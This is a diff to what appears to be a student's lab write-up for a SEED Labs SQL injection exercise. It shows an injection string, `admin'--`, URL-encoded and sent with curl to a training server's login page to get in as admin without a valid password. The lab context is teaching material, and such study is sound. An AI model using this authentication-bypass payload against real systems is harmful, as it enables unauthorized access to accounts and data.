@@ -23,6 +23,7 @@
 ### 2.2
 
 - We encoded the string `admin'-- "` in this website: https://www.urlencoder.org
+- That string is equal to `admin%27--%20%22%3B`. 
 - After that, we sent the command `curl 'www.seed-server.com/unsafe_home.php?username=admin%27--%20%22%3B&Password=11'` in the terminal.
 - By doing that, we got access to the content.
 - ![task2-2](/Images/Week8/task2-2.png "task2-2")
